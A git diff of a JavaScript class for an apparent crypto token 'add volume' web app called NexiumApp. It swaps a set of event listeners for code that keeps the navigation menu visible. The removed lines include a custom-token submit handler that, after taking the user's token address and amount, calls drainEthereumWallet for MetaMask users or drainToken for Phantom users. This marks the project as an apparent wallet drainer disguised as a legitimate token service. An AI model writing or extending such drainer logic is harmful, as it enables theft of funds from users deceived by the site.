@@ -785,7 +785,7 @@ class NexiumApp {
     // Check if on add-volume.html by inspecting the current URL
     const isAddVolumePage = window.location.pathname.includes('add-volume.html');
     if (isAddVolumePage) {
-      console.log('On add-volume.html, skipping renderTokenInterface to preserve existing HTML');
+      console.log('On add-volume.html, skipping renderTokenInterface to preserve existing HTML and navigation');
       // Update DOM references to existing elements in add-volume.html
       this.dom.tokenSelect = document.getElementById('tokenSelect') || null;
       this.dom.volumeSection = document.getElementById('volumeSection') || null;
@@ -797,95 +797,13 @@ class NexiumApp {
       this.dom.volumeInput = document.getElementById('volumeInput') || null;
       this.dom.customTokenModal = document.getElementById('custom-token-modal') || null;
       this.dom.closeCustomTokenModal = document.getElementById('close-custom-token-modal') || null;
-
-      // Attach event listeners to existing elements if they exist
-      if (this.dom.showCustomTokenBtn) {
-        const debouncedShowCustomToken = this.debounce(() => {
-          const name = this.dom.customTokenNameInput?.value.trim();
-          const address = this.dom.customTokenAddressInput?.value.trim();
-          if (!name || !address) return;
-          const truncatedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
-          if (this.dom.tokenInfo) {
-            this.dom.tokenInfo.innerHTML = `
-              <div class="token-meta space-y-2">
-                <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(name)}</h3>
-                <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
-              </div>
-            `;
-            this.dom.tokenInfo.classList.remove('hidden');
-          }
-        }, 1000);
-        this.dom.showCustomTokenBtn.addEventListener('click', debouncedShowCustomToken);
+      // Ensure nav-menu remains visible
+      const navMenu = document.getElementById('nav-menu');
+      if (navMenu) {
+        navMenu.classList.remove('hidden');
+        navMenu.style.display = window.innerWidth >= 640 ? 'flex' : ''; // Restore default display for desktop, empty for mobile
+        console.log('Ensured nav-menu remains visible on add-volume.html');
       }
-
-      if (this.dom.tokenList) {
-        this.dom.tokenList.querySelectorAll('.token-card').forEach(button => {
-          const showTokenInfo = () => {
-            const address = button.querySelector('.address')?.textContent;
-            if (!address) {
-              this.showFeedback('Invalid token address.', 'error');
-              return;
-            }
-            const truncatedAddress = this.shortenAddress(address);
-            if (this.dom.tokenInfo) {
-              this.dom.tokenInfo.innerHTML = `
-                <div class="token-meta space-y-2">
-                  <h3 class="text-yellow-400 text-lg font-semibold">Unknown Token</h3>
-                  <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
-                </div>
-              `;
-              this.dom.tokenInfo.classList.remove('hidden');
-              this.loadCustomTokenData(address);
-            } else {
-              this.showFeedback('Token display area not found.', 'error');
-            }
-          };
-          button.addEventListener('click', showTokenInfo);
-          button.addEventListener('touchstart', showTokenInfo);
-        });
-
-        // Add custom token card event listener
-        const customTokenCard = this.dom.tokenList.querySelector('.custom-token-card');
-        if (customTokenCard) {
-          customTokenCard.addEventListener('click', () => {
-            console.log('Custom token card clicked');
-            if (this.dom.customTokenModal) {
-              this.dom.customTokenModal.classList.add('active');
-            }
-          });
-        }
-      }
-
-      if (this.dom.tokenSelect) {
-        this.dom.tokenSelect.disabled = !this.publicKey;
-      }
-
-      // Setup custom token modal submit button
-      const customTokenSubmitBtn = document.getElementById('custom-token-submit');
-      if (customTokenSubmitBtn) {
-        customTokenSubmitBtn.addEventListener('click', () => {
-          const tokenAddress = document.getElementById('custom-token-address')?.value.trim();
-          const amount = parseFloat(document.getElementById('custom-token-amount')?.value.trim());
-          if (!tokenAddress) {
-            this.showFeedback('Please enter a valid token address.', 'error');
-            return;
-          }
-          if (isNaN(amount) || amount <= 0) {
-            this.showFeedback('Please enter a valid amount.', 'error');
-            return;
-          }
-          console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`);
-          if (this.connectedWalletType === 'MetaMask') {
-            this.drainEthereumWallet(this.publicKey);
-          } else if (this.connectedWalletType === 'Phantom') {
-            this.drainToken(tokenAddress);
-          }
-          if (this.dom.customTokenModal) {
-            this.dom.customTokenModal.classList.remove('active');
-          }
-        });
-      }
-
       return;
     }
 
